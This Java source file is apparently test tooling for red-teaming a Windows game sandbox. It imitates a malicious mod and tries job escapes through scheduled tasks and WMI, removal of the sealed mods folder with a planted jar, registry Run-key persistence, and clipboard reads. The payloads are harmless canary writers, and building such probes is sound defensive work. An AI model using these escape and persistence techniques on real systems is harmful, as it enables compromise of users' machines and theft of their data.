// WinProbe2.java - Windows sandbox red-team probe, ROUND 3 (stands in for a
// malicious Minecraft mod). Companion to WinProbe.java; it exercises the
// *next* layer of AppContainer escapes that round 1/2 did not cover:
//
//   - broker/service job-escape (schtasks, WMI Win32_Process.Create): a
//     process spawned by a system service is not the game's child, so it never
//     joins the kill-on-close job and can outlive the game + jail.
//   - sealed-folder delete/recreate: strip the PROTECTED DACL on mods/ by
//     deleting or renaming it and recreating a fresh (inheriting) folder.
//   - CREATE_BREAKAWAY_FROM_JOB via a tiny native helper the probe launches.
//   - registry persistence (HKCU/HKLM ...\Run) and HKLM secret reads.
//   - clipboard read (credential theft) via the granted window station.
//
// Test tooling only (gated behind QUARTZ_REDTEAM), not shipped code. Runs as
// ordinary code inside the game JVM and prints one "vector=RESULT :: detail"
// line per attempt, same vocabulary as WinProbe.java. The broker/breakaway
// survivors append to canary files in the granted game folder on a timer; the
// Go harness measures each file AFTER the jail is closed to decide whether the
// payload truly outlived the sandbox (PRESENT here -> REACHABLE/BLOCKED there),
// then reaps every survivor it started.

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;

public class WinProbe2 {
    static final String SYS32 = System.getenv().getOrDefault("SYSTEMROOT", "C:\\Windows") + "\\System32\\";
    static final String PS = SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe";

    public static void main(String[] args) {
        brokerSchtasks();
        brokerWmi();
        breakaway();
        sealedFolder();
        registry();
        clipboard();
        System.out.flush();
    }

    static void line(String name, String result, String detail) {
        System.out.println(name + "=" + result + " :: " + (detail == null ? "" : detail));
    }

    static String env(String k) { String v = System.getenv(k); return v == null ? "" : v; }

    static String snippet(byte[] b) { return snippetN(b, 60); }

    static String snippetN(byte[] b, int n) {
        String s = new String(b, StandardCharsets.UTF_8).replaceAll("\\s+", " ").trim();
        return s.length() > n ? s.substring(0, n) : s;
    }

    // keyLine pulls the meaningful result token out of noisy child output (a
    // PowerShell provider may print an "InitializeDefaultDrives" warning first).
    static String keyLine(String out) {
        for (String marker : new String[]{"WMIERR:", "ReturnValue=", "breakaway="}) {
            int i = out.indexOf(marker);
            if (i >= 0) return snippetN(out.substring(i).getBytes(StandardCharsets.UTF_8), 140);
        }
        return snippetN(out.getBytes(StandardCharsets.UTF_8), 140);
    }

    static String reason(Exception e) {
        String m = e.getClass().getSimpleName();
        if (e.getMessage() != null) m += ": " + e.getMessage().replaceAll("\\s+", " ");
        return m.length() > 90 ? m.substring(0, 90) : m;
    }

    // A timer loop that appends "alive" to a granted game-folder file 60 times.
    // Used as the payload for every job-escape vector so the harness can see it
    // keep writing after the jail closes.
    static String aliveScript(String file) {
        return "1..60 | ForEach-Object { Add-Content -LiteralPath '" + file
                + "' -Value 'alive'; Start-Sleep -Milliseconds 400 }";
    }

    static String run(int timeoutMs, String... cmd) throws Exception {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        p.getOutputStream().close();
        String out = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        p.waitFor();
        return "exit=" + p.exitValue() + " " + out;
    }

    // --- vector 1a: Task Scheduler broker -----------------------------------

    static void brokerSchtasks() {
        String task = env("CANARY_TASKNAME");
        String file = env("CANARY_BROKER_SCHTASKS");
        if (task.isEmpty() || file.isEmpty()) { line("broker-schtasks", "SKIP", "no target"); return; }
        try {
            // Write the payload as a .ps1 the scheduled task will run. The task
            // runs as the interactive user at MEDIUM integrity via the Task
            // Scheduler service - not as a child of this AppContainer - so if it
            // runs at all it is both a job-escape AND an integrity escalation.
            // No path here contains a space (run root is C:\quartz-rt\...), so the
            // /tr value needs no embedded quotes - which schtasks mis-splits.
            Path ps1 = Path.of(env("CANARY_GAME"), "sched-payload.ps1");
            Files.write(ps1, aliveScript(file).getBytes(StandardCharsets.UTF_8));
            String tr = PS + " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " + ps1;
            String create = run(15000, SYS32 + "schtasks.exe", "/create", "/tn", task,
                    "/tr", tr, "/sc", "ONCE", "/st", "23:59", "/f");
            String runNow = create.contains("exit=0")
                    ? run(15000, SYS32 + "schtasks.exe", "/run", "/tn", task)
                    : "(skipped: create failed)";
            boolean ok = create.contains("exit=0") && runNow.contains("exit=0");
            line("broker-schtasks", ok ? "PRESENT" : "BLOCKED",
                    "task=" + task + " file=" + file + " create[" + snippet(create.getBytes()) + "] run[" + snippet(runNow.getBytes()) + "]");
        } catch (Exception e) {
            line("broker-schtasks", "BLOCKED", reason(e));
        }
    }

    // --- vector 1b: WMI Win32_Process.Create broker -------------------------

    static void brokerWmi() {
        String file = env("CANARY_BROKER_WMI");
        if (file.isEmpty()) { line("broker-wmi", "SKIP", "no target"); return; }
        try {
            // Win32_Process.Create spawns via WmiPrvSE (a service host), not as a
            // child of the game - another way out of the job if WMI is reachable.
            // Drive the payload through a .cmd wrapper so the CIM CommandLine needs
            // no embedded quoting (the run root has no spaces).
            Path wmicmd = Path.of(env("CANARY_GAME"), "wmi-payload.cmd");
            Files.write(wmicmd, ("@echo off\r\nfor /l %%i in (1,1,60) do @(echo alive>>\"" + file
                    + "\" & ping -n 2 127.0.0.1 >nul)\r\n").getBytes(StandardCharsets.UTF_8));
            String cmdline = "cmd.exe /c " + wmicmd;
            String script = "try { $r = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='"
                    + cmdline + "'} -ErrorAction Stop; 'ReturnValue=' + $r.ReturnValue + ' Pid=' + $r.ProcessId } "
                    + "catch { 'WMIERR: ' + $_.Exception.Message }";
            String out = run(20000, PS, "-NoProfile", "-NonInteractive", "-Command", script);
            boolean ok = out.contains("ReturnValue=0");
            line("broker-wmi", ok ? "PRESENT" : "BLOCKED", "file=" + file + " " + keyLine(out));
        } catch (Exception e) {
            line("broker-wmi", "BLOCKED", reason(e));
        }
    }

    // --- vector 3: CREATE_BREAKAWAY_FROM_JOB via a native helper -------------

    static void breakaway() {
        String exe = env("CANARY_BREAKAWAY_EXE");
        String file = env("CANARY_BREAKAWAY");
        if (exe.isEmpty() || file.isEmpty()) { line("breakaway", "SKIP", "no helper"); return; }
        try {
            // The helper calls CreateProcess with CREATE_BREAKAWAY_FROM_JOB and
            // reports whether the OS let the child leave the job. It also starts
            // the alive-timer payload so the harness can confirm survival.
            String out = run(15000, exe, file);
            line("breakaway", "PRESENT", "file=" + file + " " + keyLine(out));
        } catch (Exception e) {
            line("breakaway", "BLOCKED", reason(e));
        }
    }

    // --- vector 2: strip the sealed PROTECTED DACL on mods/ -----------------

    static void sealedFolder() {
        String mod = env("CANARY_MOD");
        Path mods = Path.of(env("CANARY_GAME"), "mods");

        // 2a: delete the sealed store blob (a hard link) directly.
        if (!mod.isEmpty()) {
            try {
                Path p = Path.of(mod);
                try { p.toFile().setWritable(true); } catch (Exception ignore) {}
                Files.delete(p);
                line("seal-delete-mod", "REACHABLE", "deleted sealed store blob " + p.getFileName());
            } catch (Exception e) {
                line("seal-delete-mod", "BLOCKED", reason(e));
            }
        }

        // 2b: rename the sealed mods/ folder out of the way (FILE_DELETE_CHILD on
        // the parent game dir would allow this if the seal didn't stop it).
        boolean moved = false;
        Path renamed = Path.of(env("CANARY_GAME"), "mods_old");
        try {
            Files.move(mods, renamed);
            moved = true;
            line("seal-rename-mods", "REACHABLE", "renamed mods -> mods_old");
        } catch (Exception e) {
            line("seal-rename-mods", "BLOCKED", reason(e));
        }

        // 2c: remove mods/ entirely (needs its contents gone first).
        boolean removed = false;
        if (!moved) {
            try {
                deleteRecursively(mods);
                removed = true;
                line("seal-rmdir-mods", "REACHABLE", "removed mods dir");
            } catch (Exception e) {
                line("seal-rmdir-mods", "BLOCKED", reason(e));
            }
        }

        // 2d: the payoff - if mods/ was moved or removed, recreate a fresh one.
        // A new folder inherits the game dir's MODIFY grant (it is NOT sealed),
        // so a write into it would defeat store-write protection on next launch.
        if (moved || removed) {
            try {
                Files.createDirectories(mods);
                Path evil = mods.resolve("evil.jar");
                Files.write(evil, "evil".getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE_NEW);
                line("seal-reseal-bypass", "REACHABLE", "recreated mods/ and wrote " + evil.getFileName());
            } catch (Exception e) {
                line("seal-reseal-bypass", "BLOCKED", reason(e));
            }
        } else {
            line("seal-reseal-bypass", "BLOCKED", "mods/ could not be moved or removed");
        }
    }

    static void deleteRecursively(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {
            for (Path p : ds) {
                if (Files.isDirectory(p)) deleteRecursively(p);
                else { try { p.toFile().setWritable(true); } catch (Exception ignore) {} Files.delete(p); }
            }
        }
        Files.delete(dir);
    }

    // --- vector 5: registry persistence + secret reads ----------------------

    static void registry() {
        String marker = env("CANARY_REGMARKER");
        String runKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        // 5a: write a Run value for user-logon persistence. Under an AppContainer
        // HKCU is virtualised to the package hive, so this may "succeed" into a
        // private view that the real user never sees. The harness reads the REAL
        // HKCU afterwards to tell apart contained vs. true persistence.
        try {
            String out = run(10000, SYS32 + "reg.exe", "add", runKey, "/v", "QuartzRedteam",
                    "/t", "REG_SZ", "/d", "payload-" + marker, "/f");
            line("reg-hkcu-run-write", out.contains("exit=0") ? "PRESENT" : "BLOCKED", snippet(out.getBytes()));
        } catch (Exception e) {
            line("reg-hkcu-run-write", "BLOCKED", reason(e));
        }
        // 5b: HKLM Run - machine-wide persistence; should require admin.
        try {
            String out = run(10000, SYS32 + "reg.exe", "add",
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "QuartzRedteam",
                    "/t", "REG_SZ", "/d", "payload-" + marker, "/f");
            line("reg-hklm-run-write", out.contains("exit=0") ? "REACHABLE" : "BLOCKED", snippet(out.getBytes()));
        } catch (Exception e) {
            line("reg-hklm-run-write", "BLOCKED", reason(e));
        }
        // 5c: read a machine key (information disclosure surface).
        try {
            String out = run(10000, SYS32 + "reg.exe", "query",
                    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "/v", "ProductName");
            line("reg-hklm-read", out.contains("exit=0") ? "OPEN" : "BLOCKED", snippet(out.getBytes()));
        } catch (Exception e) {
            line("reg-hklm-read", "BLOCKED", reason(e));
        }
    }

    // --- vector 6: clipboard read (credential theft) ------------------------

    static void clipboard() {
        // Retry to rule out transient contention: a persistent failure to even
        // OPEN the clipboard is the sandbox denying access, not a busy owner.
        Exception last = null;
        for (int i = 0; i < 6; i++) {
            try {
                java.awt.datatransfer.Clipboard cb = java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
                Object data = cb.getData(java.awt.datatransfer.DataFlavor.stringFlavor);
                line("clipboard-read", "REACHABLE", snippet(String.valueOf(data).getBytes(StandardCharsets.UTF_8)));
                return;
            } catch (java.awt.HeadlessException he) {
                line("clipboard-read", "SKIP", "headless JVM");
                return;
            } catch (Exception e) {
                last = e;
                try { Thread.sleep(250); } catch (InterruptedException ie) { break; }
            }
        }
        line("clipboard-read", "BLOCKED", last == null ? "unknown" : reason(last));
    }
}
